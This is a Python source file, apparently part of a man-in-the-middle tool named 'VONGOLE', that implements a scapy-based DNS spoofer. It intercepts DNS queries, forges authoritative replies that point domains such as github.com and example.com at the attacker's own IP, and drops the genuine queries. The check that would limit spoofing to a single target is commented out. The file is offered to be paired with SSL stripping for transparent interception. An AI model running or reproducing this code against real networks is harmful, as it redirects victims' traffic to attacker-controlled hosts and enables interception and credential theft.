import logging
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, get_if_addr
import threading
import time

logger = logging.getLogger('DNSSpoofer')

try:
    from colorama import Fore, Style
except ImportError:
    class Fore:
        RED = YELLOW = GREEN = CYAN = BLUE = MAGENTA = ''

    class Style:
        RESET_ALL = ''


class DNSSpoofer:
    """DNS spoofer that integrates with SSL stripper for transparent MITM"""

    def __init__(self, interface, target_ip, dns_mapping=None, packet_handler=None):
        self.interface = interface
        self.target_ip = target_ip
        self.packet_handler = packet_handler
        self.running = False
        self.spoofed_count = 0

        # Get our IP from the interface
        self.attacker_ip = self._get_interface_ip()

        # Default domains to spoof (well this is just what im using for tests rnow)
        if dns_mapping:
            self.spoof_domains = {k.lower(): v for k, v in dns_mapping.items()}
        else:    
            self.spoof_domains = dns_mapping or {
            'github.com': self.attacker_ip,
            'www.github.com': self.attacker_ip,
            'httpbin.org': self.attacker_ip,
            'www.httpbin.org': self.attacker_ip,
            'example.com': self.attacker_ip,
            'www.example.com': self.attacker_ip,
            'neverssl.com': self.attacker_ip,
            'www.neverssl.com': self.attacker_ip,
        }

        logger.info(
            f"DNS Spoofer initialized - redirecting to {self.attacker_ip}")

    # TODO: rip DRY
    def _get_interface_ip(self):
        try:
            return get_if_addr(self.interface)
        except Exception:
            import socket
            import fcntl
            import struct
            import platform
            if platform.system() in ("Linux", "Darwin"):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return socket.inet_ntoa(
                    fcntl.ioctl(
                        s.fileno(), 0x8915,  # SIOCGIFADDR
                        struct.pack(
                            '256s', self.interface[:15].encode('utf-8'))
                    )[20:24]
                )
            elif platform.system() == "Windows":
                import psutil
                for name, addrs in psutil.net_if_addrs().items():
                    if name == self.interface:
                        for a in addrs:
                            if a.family == socket.AF_INET:
                                return a.address
            return None

    def start(self):
        """Start DNS spoofing"""
        if not self.packet_handler:
            logger.error("No packet handler provided!")
            return False

        if not self.attacker_ip:
            logger.error("Could not determine attacker IP!")
            return False

        self.running = True

        # Add our DNS filter with high priority
        self.packet_handler.add_filter(self._dns_filter, priority=100)

        logger.info("[VONGOLE] DNS Spoofing active")
        print(
            f"{Fore.CYAN}DNS Spoofer: Redirecting domains to {self.attacker_ip}{Style.RESET_ALL}")
        print(
            f"{Fore.YELLOW}Spoofed domains: {', '.join(self.spoof_domains.keys())}{Style.RESET_ALL}")

        return True

    def stop(self):
        """Stop DNS spoofing"""
        self.running = False
        logger.info(
            f"DNS Spoofer stopped - spoofed {self.spoofed_count} queries")

    def _dns_filter(self, packet):
        """Process DNS queries and inject fake responses"""
        try:
            # Check if it's a DNS query
            if (packet.haslayer(DNS) and
                packet[DNS].qr == 0 and  # Query, not response
                packet.haslayer(IP) and
                packet.haslayer(UDP) and
                    packet[UDP].dport == 53):  # DNS port

                # Only process queries from target
                # if packet[IP].src != self.target_ip:
                #    return False

                # Get queried domain
                if packet.haslayer(DNSQR):
                    qname = packet[DNSQR].qname
                    if isinstance(qname, bytes):
                        domain = qname.decode('utf-8').rstrip('.').lower()
                    else:
                        domain = str(qname).rstrip('.').lower()

                    # Check if we should spoof this domain
                    spoof_ip = None
                    for spoof_domain, ip in self.spoof_domains.items():
                        if domain == spoof_domain or domain.endswith('.' + spoof_domain):
                            spoof_ip = ip
                            break

                    if spoof_ip:
                        print(
                            f"\n{Fore.GREEN}[VONGOLE] DNS SPOOFING: {domain} -> {spoof_ip}{Style.RESET_ALL}")
                        self.spoofed_count += 1

                        # Create spoofed DNS response
                        dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                            DNS(
                            id=packet[DNS].id,
                            qr=1,               # This is a response
                            aa=1,               # Authoritative answer
                            qd=packet[DNS].qd,  # Copy the question
                            an=DNSRR(
                                rrname=packet[DNSQR].qname,
                                type='A',
                                ttl=300,
                                rdata=spoof_ip
                            )
                        )

                        send(dns_reply, iface=self.interface, verbose=0)

                        # Drop the original query so it doesnt reach the real DNS server
                        return True

        except Exception as e:
            logger.debug(f"DNS filter error: {e}")

        return False  # dont block other packets
